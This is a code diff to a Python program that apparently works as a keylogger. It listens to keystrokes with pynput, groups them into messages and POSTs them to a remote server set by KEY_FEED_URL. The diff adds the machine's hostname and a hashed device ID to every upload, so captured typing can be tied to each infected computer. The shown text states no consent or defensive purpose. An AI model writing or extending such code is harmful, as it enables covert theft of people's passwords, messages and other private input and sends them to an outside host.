@@ -1,6 +1,9 @@
 import os
 import time
 import json
+import hashlib
+import platform
+import socket
 from threading import Lock
 from urllib.error import URLError, HTTPError
 from urllib.request import Request, urlopen
@@ -10,6 +13,8 @@ from pynput.keyboard import Key, KeyCode, Listener
 MESSAGE_GAP_MS = 1200
 SITE_URL = os.getenv("KEY_FEED_URL", "https://your-app.onrender.com").rstrip("/")
 API_KEY = os.getenv("KEY_FEED_API_KEY", "")
+device_name = platform.node() or socket.gethostname() or "Unknown device"
+device_id = hashlib.sha256(device_name.encode("utf-8")).hexdigest()[:12]
 message_buffer = ""
 last_key_time_ms = None
 message_started_ms = None
@@ -51,7 +56,9 @@ def send_message(text):
             headers["X-API-Key"] = API_KEY
         request = Request(
             f"{SITE_URL}/api/messages",
-            data=json.dumps({"text": text}).encode("utf-8"),
+            data=json.dumps(
+                {"text": text, "device_id": device_id, "device_name": device_name}
+            ).encode("utf-8"),
             headers=headers,
             method="POST",
         )
